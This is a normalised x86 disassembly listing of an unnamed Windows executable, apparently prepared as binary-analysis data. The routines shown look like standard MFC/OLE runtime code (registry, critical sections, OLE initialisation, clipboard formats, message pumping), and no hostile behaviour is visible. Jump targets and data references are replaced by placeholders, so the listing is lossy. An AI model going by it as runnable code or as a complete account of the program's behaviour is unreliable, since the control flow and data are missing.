mov ebx [ RegCreateKeyExA@IAT ]
push [ ebp - 0x4 ]
call ebx
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
je r-xdata
push [ ebp - 0x4 ]
call esi
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push edi
push esi
push edi
push edi
push edi
push [ eax + 0x90 ]
push [ ebp - 0x8 ]
call ebx
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
call esi
sub_423760
push ebp
mov ebp esp
push ecx
push ecx
push esi
xor esi esi
push edi
mov [ ebp - 0x4 ] esi
call sub_4236cc
mov edi eax
cmp edi esi
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x2001f
push esi
push esi
push esi
push [ ebp + 0x8 ]
push edi
call [ RegCreateKeyExA@IAT ]
push edi
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0x4
sub_423816
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_42385b
cmp [ rw-data ] 0x0
je r-xdata
retn
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
push edi
mov edi [ DeleteCriticalSection@IAT ]
push rw-data
call edi
mov esi rw-data
mov ebx rw-data
add ebx 0x18
add esi 0x4
cmp ebx rw-data
jl r-xdata
push ebx
call edi
dec [ esi ]
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
sub_4238a9
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_423816
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_423964
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_4239b6
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_41f6f5
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_41f6b1
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_423a51
mov eax sub_4260fc
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_423a92
mov eax sub_426110
call sub_40cc20
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov eax [ rw-data ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
call eax
sub_423b26
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_423b5f
push esi
mov esi [ SetErrorMode@IAT ]
push 0x0
call esi
or ax 0x8001
push eax
call esi
call sub_422d64
mov esi [ esp + 0x8 ]
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
call sub_422d64
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_422d64
cmp [ eax + 0x14 ] 0x0
pop esi
jne r-xdata
mov ecx [ esp + 0xc ]
mov [ eax + 0x68 ] esi
mov [ eax + 0x6c ] ecx
mov ecx [ esp + 0x10 ]
mov [ eax + 0x70 ] ecx
mov ecx [ esp + 0x14 ]
mov [ eax + 0x74 ] ecx
mov ecx eax
call sub_423bc2
push 0x1
pop eax
retn 0x10
call sub_41ad9e
sub_423bc2
push ebp
mov ebp esp
sub esp 0x30c
push ebx
push esi
push edi
mov esi ecx
call sub_422d64
mov edi eax
mov eax [ esi + 0x68 ]
mov ebx 0x104
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x68 ]
mov [ edi + 0xc ] eax
lea eax [ ebp - 0x20c ]
push ebx
push eax
push [ esi + 0x68 ]
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x20c ]
push 0x2e
push eax
call sub_40d165
and [ eax ] 0x0
pop ecx
pop ecx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x108 ]
push ebx
push eax
lea eax [ ebp - 0x20c ]
push eax
call sub_423cdf
xor ebx ebx
cmp [ esi + 0x88 ] ebx
jne r-xdata
cmp [ esi + 0x78 ] ebx
jne r-xdata
lea eax [ ebp - 0x108 ]
push eax
call sub_40cc3f
pop ecx
mov [ esi + 0x88 ] eax
mov eax [ esi + 0x78 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x8c ] ebx
lea edi [ esi + 0x8c ]
jne r-xdata
lea eax [ ebp - 0x30c ]
push 0x100
push eax
push 0xe000
call sub_41f494
test eax eax
je r-xdata
cmp [ esi + 0x90 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
push r--data
push ebx
call [ lstrcpyA@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call sub_40cc3f
mov [ edi ] eax
and [ ebx ] 0x0
pop ecx
push [ esi + 0x88 ]
lea eax [ ebp - 0x30c ]
push eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x108 ]
push r--data
push eax
call [ lstrcatA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call sub_40cc3f
pop ecx
mov [ esi + 0x90 ] eax
call sub_40cc3f
pop ecx
mov [ esi + 0x78 ] eax
sub_423cdf
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi esi
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov al [ esi ]
cmp al 0x5c
je r-xdata
push [ esp + 0x14 ]
push edi
push [ esp + 0x18 ]
call [ lstrcpynA@IAT ]
xor eax eax
push edi
call [ lstrlenA@IAT ]
inc eax
jmp r-xdata
push esi
call sub_40d477
pop ecx
mov edi eax
cmp al 0x2f
je r-xdata
pop edi
pop esi
retn 0xc
cmp [ esi ] 0x0
je r-xdata
cmp al 0x3a
jne r-xdata
push esi
call sub_40d477
pop ecx
mov esi eax
jmp r-xdata
sub_423d50
push esi
push edi
mov edi [ RegisterClipboardFormatA@IAT ]
mov esi ecx
push r--data
call edi
push r--data
mov [ esi ] eax
call edi
push r--data
mov [ esi + 0x4 ] eax
call edi
push r--data
mov [ esi + 0x8 ] eax
call edi
push r--data
mov [ esi + 0xc ] eax
call edi
push r--data
mov [ esi + 0x10 ] eax
call edi
push r--data
mov [ esi + 0x14 ] eax
call edi
push r--data
mov [ esi + 0x18 ] eax
call edi
push r--data
mov [ esi + 0x1c ] eax
call edi
push r--data
mov [ esi + 0x20 ] eax
call edi
push r--data
mov [ esi + 0x24 ] eax
call edi
push r--data
mov [ esi + 0x28 ] eax
call edi
mov [ esi + 0x2c ] eax
mov eax esi
pop edi
pop esi
retn
sub_423dd6
mov eax sub_4266bd
call sub_40cc20
push ecx
push ebx
push esi
call sub_422b32
mov esi eax
call sub_422d64
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
push ebx
call [ OleInitialize@IAT ]
cmp eax ebx
jge r-xdata
or [ esi + 0x114 ] 0xffffffff
jmp r-xdata
mov [ esi + 0x114 ] 0x1
call sub_41ad89
mov esi eax
cmp [ esi + 0x58 ] ebx
mov [ esi + 0x54 ] sub_423ece
jne r-xdata
push ebx
call sub_423e73
xor eax eax
jmp r-xdata
push 0x1
pop eax
push 0x40
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
cmp ecx ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
xor eax eax
call sub_423fbb
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
call sub_41ad89
mov ecx [ eax + 0x58 ]
call sub_424019
sub_423e73
push esi
call sub_42478c
call sub_425afb
call sub_40bae6
cmp [ esp + 0x8 ] 0x0
jne r-xdata
pop esi
retn 0x4
call sub_41ad89
mov esi eax
test esi esi
je r-xdata
call sub_422b32
cmp [ eax + 0x114 ] 0x1
lea esi [ eax + 0x114 ]
jne r-xdata
mov ecx [ esi + 0x58 ]
test ecx ecx
je r-xdata
call [ CoFreeUnusedLibraries@IAT ]
call [ OleUninitialize@IAT ]
and [ esi ] 0x0
and [ esi + 0x58 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_423ece
cmp [ esp + 0x4 ] 0x0
push esi
je r-xdata
cmp [ rw-data ] 0x0
mov esi [ GetTickCount@IAT ]
jne r-xdata
push [ esp + 0xc ]
call sub_423e73
jmp r-xdata
call esi
sub eax [ rw-data ]
cmp eax 0xea60
jbe r-xdata
call esi
inc [ rw-data ]
mov [ rw-data ] eax
pop esi
retn 0x8
call [ CoFreeUnusedLibraries@IAT ]
call esi
mov [ rw-data ] eax
sub_423f23
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call [ SysStringLen@IAT ]
xor esi esi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov ebp eax
push esi
push esi
push ebp
push ebx
push esi
push esi
call edi
push eax
mov ecx [ esp + 0x18 ]
mov [ esp + 0x1c ] eax
call sub_41c646
push esi
push esi
push [ esp + 0x20 ]
push eax
push ebp
push ebx
push esi
push esi
call edi
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_423f68
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
push edi
push ebx
call [ SysStringLen@IAT ]
xor esi esi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
mov ebp eax
push esi
push esi
push ebp
push ebx
push esi
push esi
call edi
push eax
push esi
mov [ esp + 0x20 ] eax
call [ SysAllocStringByteLen@IAT ]
push esi
push esi
push [ esp + 0x20 ]
mov [ esp + 0x1c ] eax
push eax
push ebp
push ebx
push esi
push esi
call edi
pop edi
pop esi
mov eax [ esp + 0x8 ]
pop ebp
pop ebx
pop ecx
retn 0x4
sub_423fbb
push esi
mov esi ecx
call sub_41b33b
push 0x1
mov [ esi + 0x3c ] r--data
pop eax
xor ecx ecx
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi ] r--data
mov [ esi + 0x20 ] ecx
mov [ esi + 0x34 ] 0x2
mov [ esi + 0x30 ] 0x2710
mov [ esi + 0x38 ] 0x1f40
mov [ esi + 0x2c ] ecx
mov [ esi + 0x1c ] ecx
mov eax esi
pop esi
retn
sub_424019
push esi
mov esi ecx
push 0x0
lea eax [ esi + 0x3c ]
push eax
call [ CoRegisterMessageFilter@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop esi
retn
push 0x1
pop eax
mov [ esi + 0x1c ] eax
pop esi
retn
sub_42408a
jmp r-xdata
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_42408f
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi ] 0x0
jmp r-xdata
pop esi
retn 0x4
sub_4240c4
push esi
mov esi ecx
cmp [ esi + 0x4 ] 0x0
lea eax [ esi + 0x4 ]
jne r-xdata
push edi
push eax
call [ InterlockedDecrement@IAT ]
mov edi eax
test edi edi
jne r-xdata
xor eax eax
pop esi
retn
mov eax edi
pop edi
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
sub_424101
push ebx
mov ebx ecx
push esi
mov esi [ esp + 0xc ]
mov eax [ ebx ]
push edi
push esi
call [ eax + 0x44 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x38 ]
mov edi eax
mov eax [ esi ]
cmp [ r--data ] eax
jne r-xdata
mov edx [ edi + 0x4 ]
mov eax [ esi + 0x4 ]
cmp eax [ r--data ]
jne r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi ]
cmp [ ecx ] eax
jne r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ r--data ]
jne r-xdata
xor eax eax
add edx 0x8
jmp r-xdata
mov eax [ ecx + 0x4 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ r--data ]
jne r-xdata
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ ecx + 0x8 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ edi + 0x4 ]
xor edx edx
mov eax [ ecx + 0xc ]
cmp eax [ esi + 0xc ]
jne r-xdata
mov edi [ edi ]
cmp edi edx
jne r-xdata
mov eax [ ecx + 0x4 ]
add eax ebx
cmp [ eax ] edx
jne r-xdata
mov eax [ edx + 0x4 ]
add eax ebx
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
add ecx 0x8
jmp r-xdata
cmp [ ecx ] edx
je r-xdata
sub_4241af
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ecx ]
push esi
push edi
mov [ ebp - 0x8 ] ecx
call [ eax + 0x38 ]
mov edi eax
lea esi [ eax + 0x4 ]
add eax 0x8
jmp r-xdata
mov edi [ edi ]
test edi edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0x8 ]
mov eax [ eax + ecx ]
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
xor eax eax
add esi 0x8
jmp r-xdata
mov ecx [ eax ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx ]
test eax eax
jne r-xdata
cmp [ esi ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_42420f
push esi
push edi
push [ esp + 0xc ]
mov edi ecx
call sub_424101
mov esi [ esp + 0x10 ]
test eax eax
mov [ esi ] eax
je r-xdata
push [ esp + 0xc ]
mov ecx edi
call sub_4241af
mov [ esi ] eax
neg eax
sbb eax eax
and eax 0x7fffbffe
add eax 0x80004002
mov ecx edi
call sub_4240ab
xor eax eax
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_424251
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_42420f
push [ esp + 0x8 ]
mov ecx [ eax ]
push [ esp + 0x8 ]
push eax
call [ ecx ]
jmp r-xdata
retn 0x8
sub_424277
mov eax sub_4267c1
call sub_40cc20
push ecx
push esi
push 0xc
call sub_41b806
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov ecx esi
call sub_41f634
and [ esi + 0x8 ] 0x0
mov [ esi ] r--data
jmp r-xdata
push ebx
lea eax [ ebp + 0x10 ]
push ebx
push eax
push 0x800
push [ ecx + 0x8 ]
push ebx
push 0x1100
call [ FormatMessageA@IAT ]
test eax eax
jne r-xdata
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
mov [ ebp + 0x8 ] esi
call sub_40da39
pop esi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ lstrcpynA@IAT ]
push [ ebp + 0x10 ]
call [ LocalFree@IAT ]
push 0x1
pop eax
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_42431f
push ebp
mov ebp esp
mov eax 0x110
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax 0x111
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_41b83a
jmp r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x63
jne r-xdata
pop ebp
retn 0x10
push 0x0
push 0xe146
push eax
push [ ebp + 0x8 ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
sub_4243a0
push esi
push edi
push [ esp + 0x18 ]
mov esi ecx
call sub_42436a
lea edi [ esi + 0x60 ]
push 0x2c
push 0x0
push edi
mov [ esi ] r--data
call sub_40cc70
mov eax [ esp + 0x20 ]
add esp 0xc
cmp [ esp + 0x10 ] 0x0
mov [ edi ] 0x2c
mov [ esi + 0x64 ] eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esi + 0x70 ] sub_42431f
mov [ esi + 0x84 ] eax
mov eax esi
pop edi
pop esi
retn 0x10
or al 0x8
mov [ esi + 0x64 ] eax
sub_42441b
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
push eax
call sub_421b24
push esi
mov [ esi + 0x68 ] eax
call sub_41d07d
lea eax [ esi + 0x60 ]
push eax
call Ordinal_oledlg_8
mov edi eax
call sub_41d0c9
mov ecx esi
call sub_41cc49
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ eax + 0x1c ]
push 0x2
pop eax
cmp edi eax
je r-xdata
push 0x1
push [ ebp - 0x4 ]
call [ EnableWindow@IAT ]
pop edi
pop esi
leave
retn
cmp edi 0x75
jne r-xdata
cmp edi 0x76
je r-xdata
mov [ esi + 0x8c ] 0x1
jmp r-xdata
mov [ esi + 0x8c ] eax
cmp edi 0x77
jne r-xdata
push 0x1
pop eax
push edi
mov ecx esi
call sub_424382
mov [ esi + 0x8c ] 0x3
jmp r-xdata
sub_4244ab
push esi
mov esi ecx
call sub_41b33b
mov eax [ esp + 0x8 ]
mov [ esi + 0x34 ] r--data
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x10 ]
and [ esi + 0x20 ] 0x0
and [ esi + 0x28 ] 0x0
mov [ esi + 0x2c ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x24 ] eax
mov eax [ esp + 0x14 ]
mov [ esi + 0x30 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x10
sub_424506
mov eax sub_426670
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x20 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
call sub_4240c4
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41b355
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push [ esi + 0x24 ]
call sub_41b82f
pop ecx
sub_424554
push esi
mov esi ecx
mov ecx [ esi + 0x28 ]
cmp ecx [ esi + 0x2c ]
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
imul eax ecx
add eax [ esi + 0x24 ]
push eax
push [ esp + 0x10 ]
call sub_40ce30
add esp 0xc
inc [ esi + 0x28 ]
push 0x1
pop eax
xor eax eax
jmp r-xdata
pop esi
retn 0x4
sub_4245a1
mov eax sub_426685
call sub_40cc20
push ecx
push esi
mov esi ecx
push 0x38
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ esi + 0x28 ]
pop esi
mov [ eax + 0x28 ] ecx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push eax
push [ esi + 0x2c ]
push [ esi + 0x24 ]
push [ esi + 0x1c ]
call sub_4244ab
sub_42461c
mov eax sub_426690
call sub_40cc20
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
lea edi [ eax - 0x34 ]
mov eax [ ebp + 0x14 ]
test eax eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] ebx
mov [ ebp + 0x10 ] 0x8000ffff
and [ eax ] 0x0
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x50 ]
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
mov [ ebp + 0x10 ] eax
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub ebx [ ebp + 0x8 ]
mov [ eax ] ebx
add esi [ edi + 0x1c ]
dec [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_4246a4
mov eax sub_42669c
call sub_40cc20
push ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
push esi
lea esi [ eax - 0x34 ]
mov eax [ ebp + 0xc ]
push edi
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x10 ] esp
mov ecx [ ebp - 0xc ]
xor eax eax
cmp [ ebp + 0x8 ] eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
setne al
pop ebx
leave
retn 0x8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x54 ]
test eax eax
je r-xdata
dec [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_424714
mov eax sub_4266a8
call sub_40cc20
push ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea esi [ eax - 0x34 ]
and [ ebx ] 0x0
push edi
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x10 ] esp
mov [ ebp + 0x8 ] 0x8000ffff
call [ eax + 0x5c ]
mov edi eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov [ edi + 0x20 ] esi
mov [ edi + 0x20 ] eax
jmp r-xdata
mov eax [ edi + 0x20 ]
add eax 0x4
push eax
call [ InterlockedIncrement@IAT ]
add edi 0x34
and [ ebp + 0x8 ] 0x0
mov [ ebx ] edi
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x8
sub_42479c
push esi
push sub_4247d7
mov ecx rw-data
call sub_42360a
mov esi eax
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
xor eax eax
pop esi
retn
push r--data
call sub_424101
push eax
call [ OleIsCurrentClipboard@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
pop esi
retn
and [ esi + 0x8 ] 0x0
sub_4247d7
mov eax sub_426819
call sub_40cc20
push ecx
push 0x14
call sub_423143
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call sub_42403e
sub_424818
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi [ PeekMessageA@IAT ]
push 0x3
xor ebx ebx
push 0xf
push 0xf
lea eax [ ebp - 0x1c ]
push ebx
push eax
call esi
test eax eax
je r-xdata
mov eax ebx
pop esi
pop ebx
leave
retn 0x4
push 0x1
pop ebx
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x3
push 0xf
push 0xf
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call esi
test eax eax
jne r-xdata
sub_424860
push ebp
mov ebp esp
sub esp 0x1c
push esi
mov esi r--data
add esi 0x4
cmp esi r--data
jl r-xdata
cmp [ ebp - 0x18 ] 0x100
je r-xdata
mov eax [ esi ]
push 0x2
push eax
push eax
lea eax [ ebp - 0x1c ]
push 0x0
push eax
call [ PeekMessageA@IAT ]
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
shr eax 0x10
test ah 0x40
je r-xdata
cmp [ ebp - 0x18 ] 0x104
jne r-xdata
push 0x1
pop eax
jmp r-xdata
pop esi
leave
retn 0x4
sub_4248b6
mov eax sub_4267eb
call sub_40cc20
sub esp 0x98
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push esi
push esi
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa4 ]
call sub_4243a0
or [ ebp + 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
call sub_42441b
cmp eax 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_424410
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
sub_424931
mov eax sub_426803
call sub_40cc20
sub esp 0x98
push ebx
push esi
push edi
xor esi esi
mov [ ebp - 0x10 ] esp
push esi
push esi
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0xa4 ]
call sub_4243a0
or [ ebp + 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
call sub_42441b
cmp eax 0x1
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_424410
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
sub_4249e8
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ eax - 0x1c ] edi
jne r-xdata
cmp [ ebp + 0xc ] 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x1
push esi
je r-xdata
mov eax [ eax - 0x8 ]
cmp [ ebp + 0xc ] 0x4
je r-xdata
mov esi 0x36a
push edi
push esi
push esi
lea eax [ ebp - 0x1c ]
push edi
push eax
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x4
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
pop esi
jmp r-xdata
push edi
push edi
push esi
call [ GetCurrentThreadId@IAT ]
push eax
call [ PostThreadMessageA@IAT ]
pop edi
leave
retn 0x14
sub_424a4a
mov eax [ esp + 0x4 ]
cmp [ esp + 0x10 ] 0x1
push esi
lea esi [ eax - 0x3c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax [ esi + 0x30 ]
jbe r-xdata
pop esi
retn 0x10
xor eax eax
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
